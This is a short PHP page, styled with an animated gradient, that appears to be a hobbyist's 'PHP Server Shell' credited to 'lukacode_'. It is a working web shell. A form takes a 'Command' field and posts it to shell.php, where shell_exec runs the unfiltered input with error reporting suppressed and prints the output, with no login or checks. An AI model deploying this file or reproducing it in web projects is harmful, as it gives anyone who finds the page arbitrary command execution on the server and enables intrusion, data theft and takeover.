<!DOCTYPE HTML>
<html>  
<meta charset="utf-8">
<body>
	<style>
		 body{
  margin : 0;
  padding: 0;
  font-family:sans-serif;
  background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
  background-size: 400% 400%;
  animation: gradient 15s ease infinite;
  height: 100vh;
}

@keyframes gradient {
  0% {
    background-position: 0% 50%;
  }
  50% {
    background-position: 100% 50%;
  }
  100% {
    background-position: 0% 50%;
  }
}
.box{
  width: 300px;
  padding: 40px;
  position: absolute;
  top: 50% ;
  left: 50% ;
  transform: translate(-50%, -50%);
  background-color: #191919;
  text-align: center;

}
h2{
	color: white;
}
.box h1{
color: white;
text-transform: uppercase;
font-weight: 500;
}
.box input[type= "text"],.box input[type="password"]{
  border: 0;
  background: none;
  display: block;
  margin: 20px auto;
  text-align: center;
  border: 2px solid #3498db ;
  padding: 14px 10px;
  width: 200px;
  outline:none;
  color: white;
  border-radius: 24px;
  transition: 0.255;
}
.box input[type= "text"]:focus,.box input[type="password"]:focus{
width: 280px;
border-color: #2ecc71 ;
}
.box input[type= "submit"]{
  border: 0;
  background: none;
  display: block;
  margin: 20px auto;
  text-align: center;
  border: 2px solid #2ecc71;
  padding: 14px 40px;
  width: 200px;
  outline:none;
  color: white;
  border-radius: 24px;
  transition: 0.255;
  cursor: pointer;
}
.box input[type= "submit"]:hover{
  background: #2ecc71;
}
	</style>
	<center>
		<form class="box" action="shell.php" method="post">
		<h1>  PHP Server Shell </h1>
		<input placeholder="Command" type="text" name="name">
		<input type="submit" value="Send Command ">
		<h2>developer : lukacode_</h2>
    </center>
</form>
</body>
</html>
<?php
error_reporting(0);
$output = shell_exec($_POST["name"]);
echo "<pre>$output</pre>";
?>
